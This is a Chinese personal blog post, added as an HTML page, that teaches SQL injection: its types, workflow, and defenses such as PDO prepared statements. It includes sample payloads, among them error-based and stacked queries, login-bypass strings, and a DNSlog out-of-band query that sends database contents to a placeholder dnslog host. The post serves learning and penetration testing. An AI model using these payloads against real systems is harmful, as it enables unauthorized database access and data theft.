@@ -1,0 +1,383 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入 | 沐风的blog</title><meta name="author" content="沐风"><meta name="copyright" content="沐风"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入相关内容">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://example.com/2025/09/08/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="沐风的blog">
+<meta property="og:description" content="SQL注入相关内容">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/touxiang.png">
+<meta property="article:published_time" content="2025-09-08T01:23:09.000Z">
+<meta property="article:modified_time" content="2025-09-11T08:00:04.630Z">
+<meta property="article:author" content="沐风">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/touxiang.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL注入",
+  "url": "http://example.com/2025/09/08/SQL%E6%B3%A8%E5%85%A5/",
+  "image": "http://example.com/img/touxiang.png",
+  "datePublished": "2025-09-08T01:23:09.000Z",
+  "dateModified": "2025-09-11T08:00:04.630Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "沐风",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/09/08/SQL%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":"ture","top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/artitalk"><i class="fa-fw fas fa-lightbulb"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><!-- 左侧博客信息区域--><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">沐风的blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入</span></a></span><!-- 新增的导航菜单容器（居中布局关键）--><div id="nav-menus-container"><!-- 菜单主体部分--><div id="menus"><!-- 菜单项--><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/artitalk"><i class="fa-fw fas fa-lightbulb"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><!-- 右侧功能区域（新增容器）--><div id="nav-right-container"><!-- 搜索按钮（移动到右侧）--><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><!-- 移动端汉堡菜单按钮--><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-08T01:23:09.000Z" title="发表于 2025-09-08 09:23:09">2025-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-11T08:00:04.630Z" title="更新于 2025-09-11 16:00:04">2025-09-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="information-schema内置库"><a href="#information-schema内置库" class="headerlink" title="information_schema内置库"></a>information_schema内置库</h2><blockquote>
+<p>schemata 记录当前mysql下所有库名</p>
+<p> tables 用来记录当前mysql下所有数据库下的表表名</p>
+<p> columns 记录当前mysq下所有字段名的</p>
+<p> schema_name 记录库名的字段</p>
+<p> table_name 记录表名的字段</p>
+<p> column_name 记录字段名的字段</p>
+</blockquote>
+<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>SQL注入是指Web应用程序对用户输入数据的合法性未进行判断、处理 。前端传入的参数是攻击者可控的 ，并且 参数被正常带入到数据库中执行 ，攻击者可以通过构造不同的SQL语句来对数据库进行操作，正常情况下，攻击者可以对数据库进行高危操作（例如，数据查询、WebShell写入、命令执行等操作）。</p>
+<h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><p>数据库信息泄露：泄露数据库中存放的数据、用户隐私等</p>
+<p>获取数据库权限：当权限足够高时，可以获取系统主机权限</p>
+<p>获取Webshell：当权限为root切纸刀绝对路径时，可以直接写入一句话木马到服务器</p>
+<p>网页篡改：注入出后台管理员用户，登录后台发布恶意数据、篡改后台数据等</p>
+<p>文件读取：读取敏感文件</p>
+<p>万能密码：利用特定payload登陆后台或其他页面</p>
+<h2 id="SQL注入的流程"><a href="#SQL注入的流程" class="headerlink" title="SQL注入的流程"></a>SQL注入的流程</h2><p>1、判断是否存在SQL注入，注入类型是字符型还是数字型</p>
+<p>2、猜解SQL查询语句中的字段数</p>
+<p>3、确定显示的字段回显位置</p>
+<p>4、获取当前数据库</p>
+<p>5、获取数据库中的表</p>
+<p>6、获取表中的字段名</p>
+<p>7、查询到账户的数据</p>
+<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><blockquote>
+<p>按注入点分类：POST注入、GET注入、Cookie注入、UA头注入等</p>
+<p>按注入类型分类：数字型、字符型、搜索型</p>
+<p>按手法分类：联合注入、报错注入、布尔盲注、时间盲注、堆叠注入、二次注入、宽字节注入、Cookie注入、DNSlog外带注入</p>
+</blockquote>
+<h3 id="SQL注入防御方式"><a href="#SQL注入防御方式" class="headerlink" title="SQL注入防御方式"></a>SQL注入防御方式</h3><blockquote>
+<p>函数过滤，如!is_numeric 函数   &#x2F;&#x2F; 判断变量 id 是否为数字<br>直接下载相关防范注入文件，通过 incloud 包含放在网站配置文件里面，如 360、阿里云、腾迅提供的防注入脚本<br>使用白名单过滤<br>采用 PDO 预处理<br>使用 Waf 拦截</p>
+</blockquote>
+<p>PDO预处理可以防止 SQL 注入攻击： prepare 预处理语句可以有效地防 止 SQL 注入攻击，因为它会 将 SQL 查询字符串与参数分开处理 ，确保参数 不会被解释为 SQL 代码的一部分。这有助于保护数据库免受恶意用户的攻击。</p>
+<h3 id="SQL注入手法"><a href="#SQL注入手法" class="headerlink" title="SQL注入手法"></a>SQL注入手法</h3><h4 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h4><p>即使用联合查询注入的一种方式，适用于有回显同时数据库软件版本是5.0以上得MySQL数据库（因为5.0后存在 内置库information_schema） 能够快速通过几条注入语句获取数据。 </p>
+<p>使用条件：必须保证字段数一致，即两个查询结果有相同的列数，因此要对字段数进行判断，以及回显点的判断</p>
+<p><strong>判断方式：</strong></p>
+<blockquote>
+<p>SELECT * FROM USERS WHERE ID&#x3D;1 UNION 1,2,3,4,5 </p>
+</blockquote>
+<p>or </p>
+<blockquote>
+<p>SELECT * FROM USERS WHERE ID&#x3D;1 ORDER BY n</p>
+<p>&#x2F;&#x2F;通过n来判断列数，当n小于等于列数时页面回显正常，当n大于列数时，页面异常报数据库错误</p>
+</blockquote>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>常见报错函数：</strong></p>
+<blockquote>
+<p>extractvalue()<br>updatexml()<br>floor()<br>exp()<br>linestring()<br>geometrycollection()<br>multipoint()<br>polygon()<br>multipolygon()<br>multilinestring()</p>
+</blockquote>
+<p>其中原理主要是 </p>
+<ul>
+<li><p>xpath语法错误 </p>
+</li>
+<li><p>BIGINT等数据类型溢出</p>
+</li>
+<li><p>count()+rand()+groupby() ·导致主键冲突</p>
+</li>
+</ul>
+<blockquote>
+<p>以<code>extractvalue()</code>和<code>updatexml()</code>为例：</p>
+<p>两个函数都有<code>XML路径</code> ，而在路径中，插入特殊字符是非法得，也就会产<br>生报错，而当报错内容为SQL语句得时候，SQL那边得解析器会自动解析该SQL语句，就会造成<br>SQL语句得执行，从而触发SQL注入。</p>
+</blockquote>
+<p>floor()函数 是 MYSQL 中用来取整的函数</p>
+<p>具体用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)#  </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>在SQL注入过程中，SQL语句执行后数据不会回显到前端页面，也无报错时使用特殊方法进行判断、尝试的过程</p>
+<blockquote>
+<p>注：</p>
+<p>1.页面没有回显信息<br>2.没有报错信息<br>3.但是有正常和异常两种情况 true flase</p>
+</blockquote>
+<p>相关函数：</p>
+<blockquote>
+<p>ascii() &#x2F; ord() 将某个字符串转化为ascii值<br>语句：select ascii(mid(user(),1));</p>
+<p>Lenght() 返回字段&#x2F;结果的长度<br>语法：select length(user())</p>
+<p>count() 聚合函数也称作计数函数，返回查询对象的总数<br>语法：select count(*) from student;</p>
+<p>substr() 此函数是用来截取字符串一部分。<br>语法：select substr(user(),1,2);</p>
+<p>concat()用于将数据合并输出。<br>语法：select concat(0x7e,batabase(),);</p>
+<p>limit 限制查询数<br>limit 0,1 第一个数据</p>
+</blockquote>
+<p>一般布尔盲注过程为：</p>
+<blockquote>
+<p>1.使用BP抓包</p>
+<p>2.构造Payload</p>
+<p>3.爆破</p>
+<p>4.通过爆破结果对比ASCII</p>
+<p>5.复原数据</p>
+</blockquote>
+<p><img src="./image.png" alt="img"></p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>与布尔盲注类似，但是不同点是，无论SQL语句是否执行成功，页面依然无变化。此时只能通过页面加载时间进行判断构造的SQL语句是否执行成功。设置时间延迟，正确的延迟，错误则不会延迟来进行猜解，得到正确的闭合。继续利用设置时间延迟，正常的延迟，错误则不会延迟来进行猜测各种数据</p>
+<blockquote>
+<ol>
+<li><p>没有回显数据</p>
+</li>
+<li><p>没有报错</p>
+</li>
+<li><p>没有正常和异常得页面</p>
+</li>
+</ol>
+</blockquote>
+<p>相关函数：</p>
+<blockquote>
+<p>sleep() 网页延迟n秒后，输出结果 </p>
+<p>if(a,b,c) if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c; </p>
+<p>ascii()函数&#x2F;ord()函数 将某个字符串转化为ascii值 </p>
+<p>length()函数 获取字符串的长度 </p>
+<p>substr()&#x2F;mid()函数 </p>
+</blockquote>
+<p>时间盲注过程与布尔盲注类似，仅判断SQL语句是否执行成功的方式不同</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>攻击者通过注入多个 SQL 语句到一个查询中，利用数据库支持堆叠查询的特性（即在同一条查询中执行多个 SQL 语句）来执行恶意操作。这类攻击利用了某些数据库管理系统（DBMS）允许多个 SQL 语句在一个查询中堆叠执行的特性，通常通过分号（<code>;</code>）分隔不同的 SQL 语句。</p>
+<p>堆叠注入的目的是让攻击者在一个请求中执行多个 SQL 语句，从而绕过应用程序的某些限制，进行信息泄露、数据删除、数据修改或其他恶意操作。</p>
+<p>与联合查询类似，仅是在查询语句后使用（<code>;</code>）拼接多条SQL语句</p>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>; <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables; <span class="comment">--&#x27; AND password = &#x27;[password_input]&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p> 二次注入是指已存储到数据中的恶意数据，被用户读取后再次拼接到 SQL 查询语句 中并执行从而导致的注入。  </p>
+<blockquote>
+<p>1.将恶意语句插入到数据库</p>
+<p>2.程序将恶意数据读取出来，并拼接新的SQL语句带入数据执行</p>
+</blockquote>
+<p> 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通 注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询；  </p>
+<p>图解：</p>
+<p><img src="./image-1757331250603.png" alt="null"></p>
+<p>即：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。<br><strong>利用前提：</strong></p>
+<blockquote>
+<p>1.攻击者插入恶意语句时后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义</p>
+<p>2.后端对数据库完全信任，直接使用数据库数据</p>
+</blockquote>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote>
+<p>当字符的大小为一字节时，称其为窄字节。</p>
+<p>当字符得大小为两字节时，称其为宽字节。</p>
+<p>所有英文默认占1个字节，汉字占两个字节。</p>
+<p>像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节</p>
+</blockquote>
+<p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（两字节）的时候，会认为两个字符是一个汉字（前一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ascii%E7%A0%81&spm=1001.2101.3001.7020">ascii码</a>要大于128，才到汉字的范围）,在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误.</p>
+<p>利用条件：</p>
+<blockquote>
+<p>1.数据库为GBK编码，后端为UTF-8编码<br>2.使用了转义函数，将POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p>
+</blockquote>
+<p><img src="./image-1757332404279.png" alt="null"></p>
+<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>COOKIE注入与 GET、POST 注入区别不大，只是传递的方式不一样。GET在 url 传 递参数、POST在POST 正文传递参数和值，COOKIE在 cookie 头传值；</p>
+<blockquote>
+<p> get 在 url 栏，即使提交的方法是 post 只要在 url 栏上都可以传递 get；</p>
+<p> post 在正文里，提交的方法必须存在 post；</p>
+<p> cookie 有没有post都可以；</p>
+<p> http头注入就是在头部字段中进行注入  </p>
+</blockquote>
+<h3 id="DNSlog外带注入"><a href="#DNSlog外带注入" class="headerlink" title="DNSlog外带注入"></a>DNSlog外带注入</h3><p>DNS在解析的时候会留下日志，咱们就是读取多级域名的解析日志，来获取信息。简单来说就是把信息放在域</p>
+<p>名中，传递到自己这DNS服务上，然后读取日志，获取信息；</p>
+<p>在SLQ无回显时也可使用DNSlog外带注入，前提是load_file()函数未被禁用，且mysql的my.ini文件中<code>Sercure_file_prive</code>字段为空。</p>
+<p><strong>load_file()：</strong></p>
+<p><code>load_file(&quot;[路径]&quot;)</code>：用于读取某个文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(&quot;C:\\test.txt&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>除了可以读取本机路径以外还可以读取到网络上的路径，即可以使用URL路径。</p>
+<p>常见DNSlog平台：</p>
+<blockquote>
+<p> 常见的第三方dnslog平台：</p>
+<p> http:&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">www.dnslog.cn/</a></p>
+<p> <a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
+<p> <a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p>
+</blockquote>
+<p>利用过程：</p>
+<p><img src="./1757333409976.png" alt="1757333409976"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- -mysql命令行执行：</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select hex(database())),&#x27;</span>.example.dnslog.cn\\abc<span class="string">&#x27;))) </span></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>example.dnslog.cn</code>是在DNSlog平台获取的临时DNS，命令执行后会携带返回的数据出现在平台的DNSlog日志中。</p>
+<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin </span><br><span class="line">password </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$pwd&#x27;</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> </span><br><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">admin&quot; or &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> </span><br><span class="line">admin&quot;) or &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span>  </span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">沐风</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/09/08/SQL%E6%B3%A8%E5%85%A5/">http://example.com/2025/09/08/SQL%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">沐风的blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/" title="SQL注入绕waf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SQL注入绕waf</div></div><div class="info-2"><div class="info-item-1">介绍多种waf绕过方式</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/" title="SQL注入绕waf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-11</div><div class="info-item-2">SQL注入绕waf</div></div><div class="info-2"><div class="info-item-1">介绍多种waf绕过方式</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">沐风</div><div class="author-info-description">知识是一切的基础</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/king-xyp"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#information-schema%E5%86%85%E7%BD%AE%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">information_schema内置库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">SQL注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.</span> <span class="toc-text">SQL注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">SQL注入的流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">4.1.</span> <span class="toc-text">SQL注入的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">SQL注入防御方式</span></a></li><li class="toc-item 